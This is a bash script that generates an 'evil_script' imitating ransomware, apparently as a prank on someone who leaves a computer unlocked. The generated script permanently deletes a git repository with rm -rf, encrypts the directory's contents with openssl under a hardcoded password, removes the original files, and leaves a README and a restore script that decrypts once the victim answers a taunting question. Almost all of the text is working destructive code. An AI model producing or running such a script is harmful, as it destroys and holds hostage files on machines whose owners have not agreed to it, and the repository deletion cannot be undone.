#!/usr/bin/env bash

SELF="$(realpath "$0")"
REPO_DIR="$(cd "$(dirname "$SELF")" && pwd)"

cat > ../evil_script <<'SCRIPT_TEXT'
#!/usr/bin/env bash
set -euo pipefail

PASSWORD='NO'
ARCHIVE="archive.tar.gz.enc"
SELF="$(realpath "$0")"
DIR="$(cd "$(dirname "$SELF")" && pwd)"
TMP_DIR="tmp/"

cd "$DIR"

if [[ -e "$ARCHIVE" ]]; then
    echo "Error: $ARCHIVE already exists."
    exit 1
fi

# 0. delete git repo directory
rm -rf "$REPO_DIR"

echo "0"

# 1. Archive the current directory, including hidden files.
mkdir "$TMP_DIR"

tar -czf - \
    --exclude="./$TMP_DIR" \
    --exclude="./$ARCHIVE" \
    --exclude="./$(basename "$SELF")" \
    . |
    openssl enc -aes-256-cbc -pbkdf2 -salt \
        -pass "pass:$PASSWORD" \
        -out "$TMP_DIR/$ARCHIVE"

mv "$TMP_DIR/$ARCHIVE" .
rm -rf "$TMP_DIR"

echo "1"

# 2. Create the restore script.
cat > restore <<'RESTORE_SCRIPT'
#!/usr/bin/env bash
set -euo pipefail

PASSWORD='NO'
ARCHIVE="archive.tar.gz.enc"

while true; do
    echo "WILL YOU EVER LEAVE YOUR PC UNLOCKED?"
    read -r -p "ANSWER (IN UPPERCASE): " ANSWER

    if [[ "$ANSWER" == "NO" ]]; then
        echo "Correct answer. Restoring files..."
        break
    fi

    echo "Incorrect answer. Try again."
done

openssl enc -d -aes-256-cbc -pbkdf2 \
    -pass "pass:$PASSWORD" \
    -in "$ARCHIVE" |
    tar -xzf -

echo "Restore complete."

rm README
rm "$ARCHIVE"
rm -f -- restore
RESTORE_SCRIPT

chmod +x restore

echo "2"

# 3. Create README.
cat > README <<'README_TEXT'
HOW TO RESTORE FILES? EASY, JUST RUN THE './restore' SCRIPT AND FOLLOW THE RULES.
README_TEXT

echo "3"

# 4. Delete other top-level files and directories,
# preserving the archive, README, restore script, and this script.
find "$DIR" -mindepth 1 -maxdepth 1 \
    ! -name "$ARCHIVE" \
    ! -name "README" \
    ! -name "restore" \
    ! -path "$SELF" \
    -exec rm -rf -- {} +

echo "4"

# 5. Delete this script last.
rm -f -- "$SELF"

echo "5"

echo "Done."
SCRIPT_TEXT

sed -i "s|\$REPO_DIR|$REPO_DIR|g" ../evil_script
chmod +x ../evil_script

